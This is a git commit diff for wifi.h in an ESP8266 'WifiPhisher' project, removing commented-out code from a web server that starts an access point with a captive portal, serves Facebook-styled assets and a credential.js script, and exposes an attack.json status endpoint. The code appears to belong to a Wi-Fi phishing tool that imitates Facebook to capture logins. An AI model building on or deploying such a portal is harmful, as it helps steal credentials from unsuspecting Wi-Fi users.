75b64dcf9140f04eee737108d2f6ee1ec8584498
vuongfcc <64054800+244v234@users.noreply.github.com>
2020-11-12 22:22:25 +0700

    Update wifi.h

--- ESP8266-WifiPhisher/wifi.h
+++ ESP8266-WifiPhisher/wifi.h
@@ -173,8 +173,6 @@ bool handleFileRead(String path) {
   server.streamFile(file, contentType);
 
   file.close();
-  // prnt(SPACE);
-  // prntln(W_OK);
 
   return true;
 }
@@ -186,7 +184,6 @@ void handleFileList() {
   }
 
   String path = server.arg("dir");
-  // Serial.println("handleFileList: " + path);
   Dir dir = SPIFFS.openDir(path);
 
   String output = String(OPEN_BRACKET); // {
@@ -219,10 +216,6 @@ void sendProgmem(const char *ptr, size_t size, const char *type) {
   server.send_P(200, str(type).c_str(), ptr, size);
 }
 
-// path = folder of web files, ssid = name of network, password = password ("0"
-// => no password), hidden = if the network is visible, captivePortal = enable a
-// captive portal
-// wifi_config_none_password
 void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
              bool captivePortal, bool none_password) {
   //   prnt(String(F("start startAP")));
@@ -258,8 +251,6 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
   server.on(String(F("/list")).c_str(), HTTP_GET,
             handleFileList); // list directory
 
-  // ================================================================
-  // post here the output of the webConverter.py
 #ifdef USE_PROGMEM_WEB_FILES
   if (!settings.getWebSpiffs()) {
 
@@ -270,9 +261,6 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
               []() { sendProgmem(facebookcss, sizeof(facebookcss), W_CSS); });
     server.on(String(F("/images/facebook.png")).c_str(), HTTP_GET,
               []() { sendProgmem(facebookpng, sizeof(facebookpng), W_PNG); });
-    // server.on(String(F("/images/google_icon.png")).c_str(), HTTP_GET, []() {
-    //   sendProgmem(logogooglepng, sizeof(logogooglepng), W_PNG);
-    // });
 
     server.on(String(F("/css/fonts/fontawesome-webfont.svg")).c_str(), HTTP_GET,
               []() {
@@ -280,79 +268,20 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
                             sizeof(fontawesomewebfontsvg), W_ICON);
               });
 
-    // server.on(String(F("/credential.html")).c_str(), HTTP_GET, []() {
-    //   sendProgmem(credentialhtml, sizeof(credentialhtml), W_HTML);
-    // });
-
-    // server.on(String(F("/ssids.html")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML); });
 
     server.on(String(F("/style.css")).c_str(), HTTP_GET,
               []() { sendProgmem(stylecss, sizeof(stylecss), W_CSS); });
-
-    // server.on(String(F("/js/attack.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(attackjs, sizeof(attackjs), W_JS); });
     server.on(String(F("/js/credential.js")).c_str(), HTTP_GET,
               []() { sendProgmem(credentialjs, sizeof(credentialjs), W_JS); });
-    // server.on(String(F("/js/scan.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(scanjs, sizeof(scanjs), W_JS); });
-    // server.on(String(F("/js/settings.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(settingsjs, sizeof(settingsjs), W_JS); });
     server.on(String(F("/js/site.js")).c_str(), HTTP_GET,
               []() { sendProgmem(sitejs, sizeof(sitejs), W_JS); });
-    // server.on(String(F("/js/ssids.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS); });
-    // server.on(String(F("/lang/cn.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(cnlang, sizeof(cnlang), W_JSON); });
-    // server.on(String(F("/lang/cs.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(cslang, sizeof(cslang), W_JSON); });
-    // server.on(String(F("/lang/de.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(delang, sizeof(delang), W_JSON); });
-    // server.on(String(F("/lang/en.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(enlang, sizeof(enlang), W_JSON); });
-    // server.on(String(F("/lang/es.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(eslang, sizeof(eslang), W_JSON); });
-    // server.on(String(F("/lang/fi.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(filang, sizeof(filang), W_JSON); });
-    // server.on(String(F("/lang/fr.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(frlang, sizeof(frlang), W_JSON); });
-    // server.on(String(F("/lang/it.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(itlang, sizeof(itlang), W_JSON); });
-    // server.on(String(F("/lang/ru.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(rulang, sizeof(rulang), W_JSON); });
-    // server.on(String(F("/lang/tlh.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(tlhlang, sizeof(tlhlang), W_JSON); });
+    
   }
   server.on(str(W_DEFAULT_LANG).c_str(), HTTP_GET, []() {
     if (!settings.getWebSpiffs()) {
-      // if (settings.getLang() == String(F("cn")))
-      //   sendProgmem(cnlang, sizeof(cnlang), W_JSON);
-      // else if (settings.getLang() == String(F("cs")))
-      //   sendProgmem(cslang, sizeof(cslang), W_JSON);
-      // else if (settings.getLang() == String(F("de")))
-      //   sendProgmem(delang, sizeof(delang), W_JSON);
-      // else if (settings.getLang() == String(F("en")))
-      //   sendProgmem(enlang, sizeof(enlang), W_JSON);
-      // else if (settings.getLang() == String(F("es")))
-      //   sendProgmem(eslang, sizeof(eslang), W_JSON);
-      // else if (settings.getLang() == String(F("fi")))
-      //   sendProgmem(filang, sizeof(filang), W_JSON);
-      // else if (settings.getLang() == String(F("fr")))
-      //   sendProgmem(frlang, sizeof(frlang), W_JSON);
-      // else if (settings.getLang() == String(F("it")))
-      //   sendProgmem(itlang, sizeof(itlang), W_JSON);
-      // else if (settings.getLang() == String(F("ru")))
-      //   sendProgmem(rulang, sizeof(rulang), W_JSON);
-      // else if (settings.getLang() == String(F("tlh")))
-      //   sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
-
-      // else
-      //   handleFileRead(String(F("/web/lang/")) + settings.getLang() +
-      //                  String(F(".lang")));
-    } else {
-      // handleFileRead(String(F("/web/lang/")) + settings.getLang() +
-      //                String(F(".lang")));
+      
     }
+      
   });
 #endif
   // ================================================================
@@ -368,12 +297,9 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
   server.on(String(F("/attack.json")).c_str(), HTTP_GET,
             []() { server.send(200, str(W_JSON), attack.getStatusJSON()); });
 
-  // aggressively caching static assets
   server.serveStatic("/js", SPIFFS, String(wifi_config_path + "/js").c_str(),
                      "max-age=86400");
 
-  // called when the url is not defined here
-  // use it to load content from SPIFFS
   server.onNotFound([]() {
     if (!handleFileRead(server.uri())) {
       if (settings.getCaptivePortal()) {
